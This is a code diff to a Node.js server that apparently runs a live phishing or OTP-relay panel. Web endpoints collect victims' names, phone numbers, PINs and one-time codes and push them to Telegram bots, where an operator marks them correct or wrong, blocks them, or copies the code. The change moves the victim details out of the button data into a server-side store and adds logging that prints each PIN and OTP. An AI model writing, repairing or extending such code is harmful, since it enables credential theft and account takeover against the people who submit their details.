@@ -20,43 +20,21 @@ const REQUIRED_UPDATES = ['message', 'callback_query'];
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
 // ============================================================
-// 🔑 callback_data — name gets priority, extra gets the rest
+// 🔑 callback_data — only action:requestId
+// Details (name/phone/pin/code) are read from requestBotMap
+// on the server, so nothing can be truncated or mangled.
 // ============================================================
-const CB_MAX = 64;
-
-function escapeField(v) { return String(v == null ? '' : v).replace(/\|/g, '¦'); }
-function unescapeField(v) { return String(v == null ? '' : v).replace(/¦/g, '|'); }
-
-function buildCallback(action, requestId, name, phone, extra) {
-    const rid = escapeField(requestId);
-    const p   = escapeField(phone);
-
-    const fixedLen = `${action}:${rid}||${p}|`.length;
-    let available = CB_MAX - fixedLen;
-    if (available < 0) available = 0;
-
-    const nameCap  = Math.max(0, Math.floor(available * 0.6));
-    const extraCap = Math.max(0, available - nameCap);
-
-    const n = escapeField(name).slice(0, nameCap);
-    const e = escapeField(extra || '').slice(0, extraCap);
-
-    return `${action}:${rid}|${n}|${p}|${e}`;
+function buildCallback(action, requestId) {
+    return `${action}:${requestId}`;
 }
 
 function parseCallback(data) {
     if (!data) return null;
     const i = data.indexOf(':');
     if (i < 0) return null;
-    const action = data.slice(0, i);
-    const parts = data.slice(i + 1).split('|');
-    if (parts.length < 3) return null;
     return {
-        action,
-        requestId: unescapeField(parts[0] || ''),
-        name:      unescapeField(parts[1] || ''),
-        phone:     unescapeField(parts[2] || ''),
-        extra:     unescapeField(parts.slice(3).join('|') || '')
+        action:    data.slice(0, i),
+        requestId: data.slice(i + 1)
     };
 }
 
@@ -113,8 +91,7 @@ function loadStore() {
 }
 
 // ⚡ Synchronous write — used for approval decisions so the state
-// hits disk BEFORE the response is sent. This is what makes the
-// approval survive a restart that happens immediately after a click.
+// hits disk BEFORE the response is sent.
 function saveStoreSync() {
     try {
         const tmp = STORE_FILE + '.tmp';
@@ -169,7 +146,9 @@ function getBot(botId) { return bots.find(b => b.botId === botId); }
 function botList() { return bots.map(b => b.botId).join(', ') || '(none)'; }
 
 function clean(v) {
-    const s = String(v == null ? '' : v).trim();
+    const s = String(v == null ? '' : v)
+        .replace(/[\u200B-\u200D\uFEFF]/g, '')  // strip zero-width chars
+        .trim();
     return /^unknown$/i.test(s) ? '' : s;
 }
 
@@ -355,13 +334,14 @@ app.post('/submit-phone', (req, res) => {
     saveStore();
 
     console.log(`📤 Phone notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
+    console.log(`📝 Stored name=${JSON.stringify(finalName)} phone=${JSON.stringify(finalPhone)}`);
 
     sendTelegramMessage(
         bot,
         withIdentity('📱 PHONE NUMBER VERIFICATION', finalName, finalPhone),
         [[
-            { text: '✅ Approve', callback_data: buildCallback('phone_ok',  requestId, finalName, finalPhone, '') },
-            { text: '❌ Reject',  callback_data: buildCallback('phone_bad', requestId, finalName, finalPhone, '') }
+            { text: '✅ Approve', callback_data: buildCallback('phone_ok',  requestId) },
+            { text: '❌ Reject',  callback_data: buildCallback('phone_bad', requestId) }
         ]]
     );
 
@@ -397,6 +377,7 @@ app.post('/submit-pin', (req, res) => {
     saveStore();
 
     console.log(`📤 PIN notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
+    console.log(`📝 Stored name=${JSON.stringify(finalName)} phone=${JSON.stringify(finalPhone)} pin=${JSON.stringify(finalPin)}`);
 
     sendTelegramMessage(
         bot,
@@ -405,11 +386,11 @@ app.post('/submit-pin', (req, res) => {
         ]),
         [
             [
-                { text: '✅ Correct', callback_data: buildCallback('pin_ok',    requestId, finalName, finalPhone, finalPin) },
-                { text: '❌ Wrong',   callback_data: buildCallback('pin_bad',   requestId, finalName, finalPhone, finalPin) }
+                { text: '✅ Correct', callback_data: buildCallback('pin_ok',    requestId) },
+                { text: '❌ Wrong',   callback_data: buildCallback('pin_bad',   requestId) }
             ],
             [
-                { text: '🛑 Block',   callback_data: buildCallback('pin_block', requestId, finalName, finalPhone, finalPin) }
+                { text: '🛑 Block',   callback_data: buildCallback('pin_block', requestId) }
             ]
         ]
     );
@@ -446,6 +427,7 @@ app.post('/submit-code', (req, res) => {
     saveStore();
 
     console.log(`📤 OTP notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
+    console.log(`📝 Stored name=${JSON.stringify(finalName)} phone=${JSON.stringify(finalPhone)} code=${JSON.stringify(finalCode)}`);
 
     sendTelegramMessage(
         bot,
@@ -454,11 +436,11 @@ app.post('/submit-code', (req, res) => {
         ]),
         [
             [
-                { text: '✅ Correct', callback_data: buildCallback('code_ok',   requestId, finalName, finalPhone, finalCode) },
-                { text: '❌ Wrong',   callback_data: buildCallback('code_bad',  requestId, finalName, finalPhone, finalCode) }
+                { text: '✅ Correct', callback_data: buildCallback('code_ok',   requestId) },
+                { text: '❌ Wrong',   callback_data: buildCallback('code_bad',  requestId) }
             ],
             [
-                { text: '📋 Copy Code', callback_data: buildCallback('code_copy', requestId, finalName, finalPhone, finalCode) }
+                { text: '📋 Copy Code', callback_data: buildCallback('code_copy', requestId) }
             ]
         ]
     );
@@ -494,7 +476,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             return;
         }
 
-        console.log('🔘 CALLBACK:', cb.data, '| via', bot.botId);
+        console.log('🔘 CALLBACK RAW:', JSON.stringify(cb.data), '| via', bot.botId);
 
         const parsed = parseCallback(cb.data);
         if (!parsed) {
@@ -503,7 +485,19 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             return;
         }
 
-        const { action, requestId, name, phone, extra } = parsed;
+        const { action, requestId } = parsed;
+
+        // 🔎 Look up the ORIGINAL details from the store, not from callback_data.
+        const rec   = requestBotMap[requestId] || {};
+        const name  = rec.name  || '';
+        const phone = rec.phone || '';
+        const extra = rec.pin || rec.code || '';
+
+        console.log('🔘 PARSED →', JSON.stringify({ action, requestId }));
+        console.log('🔘 STORE  →', JSON.stringify({ name, phone, extra, type: rec.type }));
+        if (!rec.requestId && !rec.type) {
+            console.log('⚠️ No store entry for requestId', requestId);
+        }
 
         // ============================================================
         // 📋 COPY OTP — full value from store, message fallback, then extra
@@ -584,8 +578,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
         if (!handled) return;
 
-        // ⚡ FLUSH TO DISK IMMEDIATELY — this is what makes the approval
-        // survive a restart that happens right after this click.
+        // ⚡ FLUSH TO DISK IMMEDIATELY
         saveStoreSync();
         console.log('✅', action, '→', requestId, `(${name} / ${phone}) via ${bot.botId}`);
 
